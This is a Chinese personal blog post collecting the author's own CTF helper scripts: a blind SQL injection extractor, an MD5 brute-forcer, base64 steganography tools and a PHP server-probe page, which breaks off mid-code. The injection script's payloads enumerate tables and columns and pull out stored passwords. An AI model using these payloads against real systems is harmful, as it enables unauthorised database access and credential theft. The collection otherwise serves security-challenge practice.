<!-- build time:Mon Jul 17 2023 20:54:04 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" href="https://blog.xcu.icu/rss.xml"><link rel="alternate" type="application/atom+xml" href="https://blog.xcu.icu/atom.xml"><link rel="alternate" type="application/json" href="https://blog.xcu.icu/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="杂记"><link rel="canonical" href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"><title>自用一些简单脚本记录 - 杂记 | ClownのBlog =</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">自用一些简单脚本记录</h1><div class="meta"><span class="item" title="创建时间：2022-10-24 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-10-24T00:00:00+08:00">2022-10-24</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>130k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>1:58</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ClownのBlog</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/37.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/4.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/94.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/86.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/7.jpg"></li><li class="item" data-background-image="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/105.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%9D%82%E8%AE%B0/" itemprop="item" rel="index" title="分类于 杂记"><span itemprop="name">杂记</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.xcu.icu/2022/10/24/%E8%87%AA%E7%94%A8%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Clown"><meta itemprop="description" content=", 一个妄想全栈web小废物"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content=""></span><div class="body md" itemprop="articleBody"><h5 id="php伪随机数爆破格式转化"><a class="anchor" href="#php伪随机数爆破格式转化">#</a> php 伪随机数爆破格式转化</h5><pre><code class="language-python">str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
str2 = 'KVQP0LdJKRaV3n9D'
str3 = str1[::-1]
length = len(str2)
res = ''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
            break
print(res) 
</code></pre><h5 id="sql注入"><a class="anchor" href="#sql注入">#</a> sql 注入</h5><pre><code class="language-python">import requests
import time

url = &quot;&quot;
payload = &#123;
	&quot;username&quot; : &quot;&quot;,
	&quot;password&quot; : &quot;123456&quot;
&#125;
result = &quot;&quot;
for i in range(1,100):
	l = 33
	r =130
	mid = (l+r)&gt;&gt;1
	while(l&lt;r):
		#payload[&quot;username&quot;] = &quot;1' || ascii(substr((database()),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot;.format(i, mid)
		#payload[&quot;username&quot;] = &quot;1' || ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot;.format(i, mid)
		#payload[&quot;username&quot;] = &quot;1' || ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot;.format(i, mid)
		payload[&quot;username&quot;] = &quot;1' || ascii(substr((select group_concat(password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot;.format(i, mid)
		html = requests.post(url,payload)
		#print(payload[&quot;username&quot;])
		#time.sleep(2)
		if &quot;Sucess&quot; in html.text:
			l = mid+1
		else:
			r = mid
		mid = (l+r)&gt;&gt;1
	if(chr(mid)==&quot; &quot;):
		break
	result = result + chr(mid)
	print(result)
print(&quot;flag: &quot; ,result)
</code></pre><h5 id="压缩包套娃"><a class="anchor" href="#压缩包套娃">#</a> 压缩包套娃</h5><pre><code class="language-py">import zipfile, os


def unzip(path, zfile):
    file_path = path + os.sep + zfile
    desdir = path + os.sep + zfile[:zfile.index('.zip')]
    srcfile = zipfile.ZipFile(file_path)
    for filename in srcfile.namelist():
        srcfile.extract(filename, desdir)
        if filename.endswith('.zip'):
            # if zipfile.is_zipfile(filename):
            path = desdir
            zfile = filename
            unzip(path, zfile)


path = r'C:\Users\陌路\Desktop\84584'#存放压缩包的路径
zfile = r'43758.zip'#压缩包名称
unzip(path, zfile)
</code></pre><h5 id="部分爆全内容hash"><a class="anchor" href="#部分爆全内容hash">#</a> 部分爆全内容 hash</h5><pre><code class="language-py">import hashlib
demo = ''
check = ''

for i in range(32, 126):
    for j in range(32, 126):
        for k in range(32, 126):
            for m in range(32, 126):
                tmp = demo + chr(i) + chr(j) + chr(k) + chr(m) + '&#125;'
                hash = hashlib.md5(tmp.encode('utf8')).hexdigest()
                print (hash)
                if check == hash:
                    print(tmp)
</code></pre><h5 id="base隐写加密"><a class="anchor" href="#base隐写加密">#</a> base 隐写加密</h5><pre><code class="language-python"># -*- coding: cp936 -*-
import base64
flag = ''  # 隐写内容
bin_str = ''.join([bin(ord(c)).replace('0b', '').zfill(8) for c in flag])
base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('0.txt', 'rb') as f0, open('1.txt', 'wb') as f1:  # '0.txt'是明文, '1.txt'用于存放隐写后的 base64
    for line in f0.readlines():
        rowstr = base64.b64encode(line.replace('\n', ''))
        equalnum = rowstr.count('=')
        if equalnum and len(bin_str):
            offset = int('0b' + bin_str[:equalnum * 2], 2)
            char = rowstr[len(rowstr) - equalnum - 1]
            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])
            bin_str = bin_str[equalnum * 2:]
        f1.write(rowstr + '\n')
</code></pre><h5 id="base隐写解密"><a class="anchor" href="#base隐写解密">#</a> base 隐写解密</h5><pre><code class="language-python"># base64隐写
import base64


def get_diff(s1, s2):
    base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in range(len(s2)):
        if s1[i] != s2[i]:
            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
    return res


def b64_stego_decode():
    file = open(&quot;flag.txt&quot;, &quot;rb&quot;)
    x = ''  # x即bin_str
    lines = file.readlines()
    for line in lines:
        l = str(line, encoding=&quot;utf-8&quot;)
        stego = l.replace('\n', '')
        # print(stego)
        realtext = base64.b64decode(l)
        # print(realtext)
        realtext = str(base64.b64encode(realtext), encoding=&quot;utf-8&quot;)
        # print(realtext)
        diff = get_diff(stego, realtext)  # diff为隐写字串与实际字串的二进制差值
        n = stego.count('=')
        if diff:
            x += bin(diff)[2:].zfill(n * 2)
        else:
            x += '0' * n * 2

    i = 0
    flag = ''
    while i &lt; len(x):
        if int(x[i:i + 8], 2):
            flag += chr(int(x[i:i + 8], 2))
        i += 8
    print(flag)


if __name__ == '__main__':
    b64_stego_decode()


</code></pre><h5 id="php探针"><a class="anchor" href="#php探针">#</a> php 探针</h5><pre><code class="language-php">&lt;?php
/* ---------------------------------------------------- */
/* 程序名称: PHP探针-Yahei
/* 程序功能: 探测系统的Web服务器运行环境
/* 程序开发: Yahei.Net
/* 联系方式: info@Yahei.net
/* Date: 1970-01-01 / 2012-07-08
/* ---------------------------------------------------- */
/* 使用条款:
/* 1.该软件免费使用.
/* 2.禁止任何衍生版本.
/* ---------------------------------------------------- */
/* 感谢以下朋友为探针做出的贡献:
/* zyypp,酷を龙卷风,龙智超,菊花肿了,闲人,Clare Lou,hotsnow
/* 二戒,yexinzhu,wangyu1314,Kokgog,gibyasus,黃子珅,A大,huli
/* 小松,charwin,华景网络
/* 您可能是下一个?
/* ---------------------------------------------------- */
error_reporting(0); //抑制所有错误信息
@header(&quot;content-Type: text/html; charset=utf-8&quot;); //语言强制
ob_start();
date_default_timezone_set('Asia/Shanghai');//此句用于消除时间差

$title = '雅黑PHP探针[简体版]';

$version = &quot;v0.4.7&quot;; //版本号



define('HTTP_HOST', preg_replace('~^www\.~i', '', $_SERVER['HTTP_HOST']));



$time_start = microtime_float();



function memory_usage() 
&#123;

	$memory	 = ( ! function_exists('memory_get_usage')) ? '0' : round(memory_get_usage()/1024/1024, 2).'MB';

	return $memory;

&#125;


// 计时

function microtime_float() 
&#123;

	$mtime = microtime();

	$mtime = explode(' ', $mtime);

	return $mtime[1] + $mtime[0];

&#125;


//单位转换
function formatsize($size) 
&#123;
	$danwei=array(' B ',' K ',' M ',' G ',' T ');
	$allsize=array();
	$i=0;

	for($i = 0; $i &lt;5; $i++) 
	&#123;
		if(floor($size/pow(1024,$i))==0)&#123;break;&#125;
	&#125;

	for($l = $i-1; $l &gt;=0; $l--) 
	&#123;
		$allsize1[$l]=floor($size/pow(1024,$l));
		$allsize[$l]=$allsize1[$l]-$allsize1[$l+1]*1024;
	&#125;

	$len=count($allsize);

	for($j = $len-1; $j &gt;=0; $j--) 
	&#123;
		$fsize=$fsize.$allsize[$j].$danwei[$j];
	&#125;	
	return $fsize;
&#125;


function valid_email($str) 
&#123;

	return ( ! preg_match(&quot;/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]&#123;2,6&#125;$/ix&quot;, $str)) ? FALSE : TRUE;

&#125;


//检测PHP设置参数

function show($varName)
&#123;

	switch($result = get_cfg_var($varName))
	&#123;

		case 0:

			return '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';

		break;
		

		case 1:

			return '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;';

		break;
		

		default:

			return $result;

		break;

	&#125;

&#125;



//保留服务器性能测试结果

$valInt = isset($_POST['pInt']) ? $_POST['pInt'] : &quot;未测试&quot;;

$valFloat = isset($_POST['pFloat']) ? $_POST['pFloat'] : &quot;未测试&quot;;

$valIo = isset($_POST['pIo']) ? $_POST['pIo'] : &quot;未测试&quot;;



if ($_GET['act'] == &quot;phpinfo&quot;) 
&#123;

	phpinfo();

	exit();

&#125; 
elseif($_POST['act'] == &quot;整型测试&quot;)
&#123;

	$valInt = test_int();

&#125; 
elseif($_POST['act'] == &quot;浮点测试&quot;)
&#123;

	$valFloat = test_float();

&#125; 
elseif($_POST['act'] == &quot;IO测试&quot;)
&#123;

	$valIo = test_io();

&#125; 
//网速测试-开始
elseif($_POST['act']==&quot;开始测试&quot;)
&#123;
?&gt;
	&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
		var acd1;
		acd1 = new Date();
		acd1ok=acd1.getTime();
	&lt;/script&gt;
	&lt;?php
	for($i=1;$i&lt;=100000;$i++)
	&#123;
		echo &quot;&lt;!--567890#########0#########0#########0#########0#########0#########0#########0#########012345--&gt;&quot;;
	&#125;
	?&gt;
	&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;
		var acd2;
		acd2 = new Date();
		acd2ok=acd2.getTime();
		window.location = '?speed=' +(acd2ok-acd1ok)+'#w_networkspeed';
	&lt;/script&gt;
&lt;?php
&#125;
//网速测试-结束
elseif($_GET['act'] == &quot;Function&quot;)
&#123;
	$arr = get_defined_functions();
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统所支持的所有函数,和自定义函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;/pre&gt;&quot;;
	exit();
&#125;elseif($_GET['act'] == &quot;disable_functions&quot;)
&#123;
	$disFuns=get_cfg_var(&quot;disable_functions&quot;);
	if(empty($disFuns))
	&#123;
		$arr = '&lt;font color=red&gt;×&lt;/font&gt;';
	&#125;
	else
	&#123; 
		$arr = $disFuns;
	&#125;
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统被禁用的函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;/pre&gt;&quot;;
	exit();
&#125;



//MySQL检测

if ($_POST['act'] == 'MySQL检测')
&#123;

	$host = isset($_POST['host']) ? trim($_POST['host']) : '';

	$port = isset($_POST['port']) ? (int) $_POST['port'] : '';

	$login = isset($_POST['login']) ? trim($_POST['login']) : '';

	$password = isset($_POST['password']) ? trim($_POST['password']) : '';

	$host = preg_match('~[^a-z0-9\-\.]+~i', $host) ? '' : $host;

	$port = intval($port) ? intval($port) : '';

	$login = preg_match('~[^a-z0-9\_\-]+~i', $login) ? '' : htmlspecialchars($login);

	$password = is_string($password) ? htmlspecialchars($password) : '';

&#125;
elseif ($_POST['act'] == '函数检测')
&#123;

	$funRe = &quot;函数&quot;.$_POST['funName'].&quot;支持状况检测结果：&quot;.isfun1($_POST['funName']);

&#125; 
elseif ($_POST['act'] == '邮件检测')
&#123;

	$mailRe = &quot;邮件发送检测结果：发送&quot;;
	if($_SERVER['SERVER_PORT']==80)&#123;$mailContent = &quot;http://&quot;.$_SERVER['SERVER_NAME'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);&#125;
	else&#123;$mailContent = &quot;http://&quot;.$_SERVER['SERVER_NAME'].&quot;:&quot;.$_SERVER['SERVER_PORT'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);&#125;
	$mailRe .= (false !== @mail($_POST[&quot;mailAdd&quot;], $mailContent, &quot;This is a test mail!&quot;)) ? &quot;完成&quot;:&quot;失败&quot;;

&#125;


//网络速度测试
if(isset($_POST['speed']))
&#123;
	$speed=round(100/($_POST['speed']/1000),2);
&#125;
elseif($_GET['speed']==&quot;0&quot;)
&#123;
	$speed=6666.67;
&#125;
elseif(isset($_GET['speed']) and $_GET['speed']&gt;0)
&#123;
	$speed=round(100/($_GET['speed']/1000),2); //下载速度：$speed kb/s
&#125;
else
&#123;
	$speed=&quot;&lt;font color=\&quot;red\&quot;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;/font&gt;&quot;;
&#125;	
	
	

// 检测函数支持

function isfun($funName = '')
&#123;

    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';

	return (false !== function_exists($funName)) ? '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';
&#125;
function isfun1($funName = '')
&#123;
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
	return (false !== function_exists($funName)) ? '√' : '×';
&#125;



//整数运算能力测试

function test_int()
&#123;

	$timeStart = gettimeofday();

	for($i = 0; $i &lt; 3000000; $i++)
	&#123;

		$t = 1+1;

	&#125;

	$timeEnd = gettimeofday();

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



//浮点运算能力测试

function test_float()
&#123;

	//得到圆周率值

	$t = pi();

	$timeStart = gettimeofday();



	for($i = 0; $i &lt; 3000000; $i++)
	&#123;

		//开平方

		sqrt($t);

	&#125;



	$timeEnd = gettimeofday();

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return $time;

&#125;



//IO能力测试

function test_io()
&#123;

	$fp = @fopen(PHPSELF, &quot;r&quot;);

	$timeStart = gettimeofday();

	for($i = 0; $i &lt; 10000; $i++) 
	&#123;

		@fread($fp, 10240);

		@rewind($fp);

	&#125;

	$timeEnd = gettimeofday();

	@fclose($fp);

	$time = ($timeEnd[&quot;usec&quot;]-$timeStart[&quot;usec&quot;])/1000000+$timeEnd[&quot;sec&quot;]-$timeStart[&quot;sec&quot;];

	$time = round($time, 3).&quot;秒&quot;;

	return($time);

&#125;

function GetCoreInformation() &#123;$data = file('/proc/stat');$cores = array();foreach( $data as $line ) &#123;if( preg_match('/^cpu[0-9]/', $line) )&#123;$info = explode(' ', $line);$cores[]=array('user'=&gt;$info[1],'nice'=&gt;$info[2],'sys' =&gt; $info[3],'idle'=&gt;$info[4],'iowait'=&gt;$info[5],'irq' =&gt; $info[6],'softirq' =&gt; $info[7]);&#125;&#125;return $cores;&#125;
function GetCpuPercentages($stat1, $stat2) &#123;if(count($stat1)!==count($stat2))&#123;return;&#125;$cpus=array();for( $i = 0, $l = count($stat1); $i &lt; $l; $i++) &#123;	$dif = array();	$dif['user'] = $stat2[$i]['user'] - $stat1[$i]['user'];$dif['nice'] = $stat2[$i]['nice'] - $stat1[$i]['nice'];	$dif['sys'] = $stat2[$i]['sys'] - $stat1[$i]['sys'];$dif['idle'] = $stat2[$i]['idle'] - $stat1[$i]['idle'];$dif['iowait'] = $stat2[$i]['iowait'] - $stat1[$i]['iowait'];$dif['irq'] = $stat2[$i]['irq'] - $stat1[$i]['irq'];$dif['softirq'] = $stat2[$i]['softirq'] - $stat1[$i]['softirq'];$total = array_sum($dif);$cpu = array();foreach($dif as $x=&gt;$y) $cpu[$x] = round($y / $total * 100, 2);$cpus['cpu' . $i] = $cpu;&#125;return $cpus;&#125;
$stat1 = GetCoreInformation();sleep(1);$stat2 = GetCoreInformation();$data = GetCpuPercentages($stat1, $stat2);
$cpu_show = $data['cpu0']['user'].&quot;%us,  &quot;.$data['cpu0']['sys'].&quot;%sy,  &quot;.$data['cpu0']['nice'].&quot;%ni, &quot;.$data['cpu0']['idle'].&quot;%id,  &quot;.$data['cpu0']['iowait'].&quot;%wa,  &quot;.$data['cpu0']['irq'].&quot;%irq,  &quot;.$data['cpu0']['softirq'].&quot;%softirq&quot;;
function makeImageUrl($title, $data) &#123;$api='http://api.yahei.net/tz/cpu_show.php?id=';$url.=$data['user'].',';$url.=$data['nice'].',';$url.=$data['sys'].',';$url.=$data['idle'].',';$url.=$data['iowait'];$url.='&amp;chdl=User|Nice|Sys|Idle|Iowait&amp;chdlp=b&amp;chl=';$url.=$data['user'].'%25|';$url.=$data['nice'].'%25|';$url.=$data['sys'].'%25|';$url.=$data['idle'].'%25|';$url.=$data['iowait'].'%25';$url.='&amp;chtt=Core+'.$title;return $api.base64_encode($url);&#125;
if($_GET['act'] == &quot;cpu_percentage&quot;)&#123;echo &quot;&lt;center&gt;&lt;b&gt;&lt;font face='Microsoft YaHei' color='#666666' size='3'&gt;图片加载慢，请耐心等待！&lt;/font&gt;&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&quot;;foreach( $data as $k =&gt; $v ) &#123;echo '&lt;img src=&quot;' . makeImageUrl( $k, $v ) . '&quot; style=&quot;width:360px;height:240px;border: #CCCCCC 1px solid;background: #FFFFFF;margin:5px;padding:5px;&quot; /&gt;';&#125;echo &quot;&lt;/center&gt;&quot;;exit();&#125;



// 根据不同系统取得CPU相关信息

switch(PHP_OS)
&#123;

	case &quot;Linux&quot;:

		$sysReShow = (false !== ($sysInfo = sys_linux()))?&quot;show&quot;:&quot;none&quot;;

	break;
	

	case &quot;FreeBSD&quot;:

		$sysReShow = (false !== ($sysInfo = sys_freebsd()))?&quot;show&quot;:&quot;none&quot;;

	break;
/*	

	case &quot;WINNT&quot;:

		$sysReShow = (false !== ($sysInfo = sys_windows()))?&quot;show&quot;:&quot;none&quot;;

	break;
*/	

	default:

	break;

&#125;



//linux系统探测

function sys_linux()

&#123;

    // CPU

    if (false === ($str = @file(&quot;/proc/cpuinfo&quot;))) return false;

    $str = implode(&quot;&quot;, $str);

    @preg_match_all(&quot;/model\s+name\s&#123;0,&#125;\:+\s&#123;0,&#125;([\w\s\)\(\@.-]+)([\r\n]+)/s&quot;, $str, $model);

    @preg_match_all(&quot;/cpu\s+MHz\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+/&quot;, $str, $mhz);

    @preg_match_all(&quot;/cache\s+size\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+\s&#123;0,&#125;[A-Z]+[\r\n]+)/&quot;, $str, $cache);

    @preg_match_all(&quot;/bogomips\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)[\r\n]+/&quot;, $str, $bogomips);

    if (false !== is_array($model[1]))

	&#123;

        $res['cpu']['num'] = sizeof($model[1]);
		/*

        for($i = 0; $i &lt; $res['cpu']['num']; $i++)

        &#123;

            $res['cpu']['model'][] = $model[1][$i].'&amp;nbsp;('.$mhz[1][$i].')';

            $res['cpu']['mhz'][] = $mhz[1][$i];

            $res['cpu']['cache'][] = $cache[1][$i];

            $res['cpu']['bogomips'][] = $bogomips[1][$i];

        &#125;*/
		if($res['cpu']['num']==1)
			$x1 = '';
		else
			$x1 = ' ×'.$res['cpu']['num'];
		$mhz[1][0] = ' | 频率:'.$mhz[1][0];
		$cache[1][0] = ' | 二级缓存:'.$cache[1][0];
		$bogomips[1][0] = ' | Bogomips:'.$bogomips[1][0];
		$res['cpu']['model'][] = $model[1][0].$mhz[1][0].$cache[1][0].$bogomips[1][0].$x1;

        if (false !== is_array($res['cpu']['model'])) $res['cpu']['model'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['model']);

        if (false !== is_array($res['cpu']['mhz'])) $res['cpu']['mhz'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['mhz']);

        if (false !== is_array($res['cpu']['cache'])) $res['cpu']['cache'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['cache']);

        if (false !== is_array($res['cpu']['bogomips'])) $res['cpu']['bogomips'] = implode(&quot;&lt;br /&gt;&quot;, $res['cpu']['bogomips']);

	&#125;


    // NETWORK


    // UPTIME

    if (false === ($str = @file(&quot;/proc/uptime&quot;))) return false;

    $str = explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str = trim($str[0]);

    $min = $str / 60;

    $hours = $min / 60;

    $days = floor($hours / 24);

    $hours = floor($hours - ($days * 24));

    $min = floor($min - ($days * 60 * 24) - ($hours * 60));

    if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

    if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

    $res['uptime'] .= $min.&quot;分钟&quot;;


    // MEMORY

    if (false === ($str = @file(&quot;/proc/meminfo&quot;))) return false;

    $str = implode(&quot;&quot;, $str);

    preg_match_all(&quot;/MemTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?MemFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?Cached\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapTotal\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+).+?SwapFree\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)/s&quot;, $str, $buf);
	preg_match_all(&quot;/Buffers\s&#123;0,&#125;\:+\s&#123;0,&#125;([\d\.]+)/s&quot;, $str, $buffers);


    $res['memTotal'] = round($buf[1][0]/1024, 2);

    $res['memFree'] = round($buf[2][0]/1024, 2);

    $res['memBuffers'] = round($buffers[1][0]/1024, 2);
	$res['memCached'] = round($buf[3][0]/1024, 2);

    $res['memUsed'] = $res['memTotal']-$res['memFree'];

    $res['memPercent'] = (floatval($res['memTotal'])!=0)?round($res['memUsed']/$res['memTotal']*100,2):0;


    $res['memRealUsed'] = $res['memTotal'] - $res['memFree'] - $res['memCached'] - $res['memBuffers']; //真实内存使用
	$res['memRealFree'] = $res['memTotal'] - $res['memRealUsed']; //真实空闲
    $res['memRealPercent'] = (floatval($res['memTotal'])!=0)?round($res['memRealUsed']/$res['memTotal']*100,2):0; //真实内存使用率

	$res['memCachedPercent'] = (floatval($res['memCached'])!=0)?round($res['memCached']/$res['memTotal']*100,2):0; //Cached内存使用率

    $res['swapTotal'] = round($buf[4][0]/1024, 2);

    $res['swapFree'] = round($buf[5][0]/1024, 2);

    $res['swapUsed'] = round($res['swapTotal']-$res['swapFree'], 2);

    $res['swapPercent'] = (floatval($res['swapTotal'])!=0)?round($res['swapUsed']/$res['swapTotal']*100,2):0;


    // LOAD AVG

    if (false === ($str = @file(&quot;/proc/loadavg&quot;))) return false;

    $str = explode(&quot; &quot;, implode(&quot;&quot;, $str));

    $str = array_chunk($str, 4);

    $res['loadAvg'] = implode(&quot; &quot;, $str[0]);


    return $res;

&#125;



//FreeBSD系统探测

function sys_freebsd()
&#123;

	//CPU

	if (false === ($res['cpu']['num'] = get_key(&quot;hw.ncpu&quot;))) return false;

	$res['cpu']['model'] = get_key(&quot;hw.model&quot;);

	//LOAD AVG

	if (false === ($res['loadAvg'] = get_key(&quot;vm.loadavg&quot;))) return false;

	//UPTIME

	if (false === ($buf = get_key(&quot;kern.boottime&quot;))) return false;

	$buf = explode(' ', $buf);

	$sys_ticks = time() - intval($buf[3]);

	$min = $sys_ticks / 60;

	$hours = $min / 60;

	$days = floor($hours / 24);

	$hours = floor($hours - ($days * 24));

	$min = floor($min - ($days * 60 * 24) - ($hours * 60));

	if ($days !== 0) $res['uptime'] = $days.&quot;天&quot;;

	if ($hours !== 0) $res['uptime'] .= $hours.&quot;小时&quot;;

	$res['uptime'] .= $min.&quot;分钟&quot;;

	//MEMORY

	if (false === ($buf = get_key(&quot;hw.physmem&quot;))) return false;

	$res['memTotal'] = round($buf/1024/1024, 2);


	$str = get_key(&quot;vm.vmtotal&quot;);

	preg_match_all(&quot;/\nVirtual Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n/i&quot;, $str, $buff, PREG_SET_ORDER);

	preg_match_all(&quot;/\nReal Memory[\:\s]*\(Total[\:\s]*([\d]+)K[\,\s]*Active[\:\s]*([\d]+)K\)\n/i&quot;, $str, $buf, PREG_SET_ORDER);


	$res['memRealUsed'] = round($buf[0][2]/1024, 2);

	$res['memCached'] = round($buff[0][2]/1024, 2);

	$res['memUsed'] = round($buf[0][1]/1024, 2) + $res['memCached'];

	$res['memFree'] = $res['memTotal'] - $res['memUsed'];

	$res['memPercent'] = (floatval($res['memTotal'])!=0)?round($res['memUsed']/$res['memTotal']*100,2):0;


	$res['memRealPercent'] = (floatval($res['memTotal'])!=0)?round($res['memRealUsed']/$res['memTotal']*100,2):0;


	return $res;

&#125;



//取得参数值 FreeBSD

function get_key($keyName)
&#123;

	return do_command('sysctl', &quot;-n $keyName&quot;);

&#125;



//确定执行文件位置 FreeBSD

function find_command($commandName)
&#123;

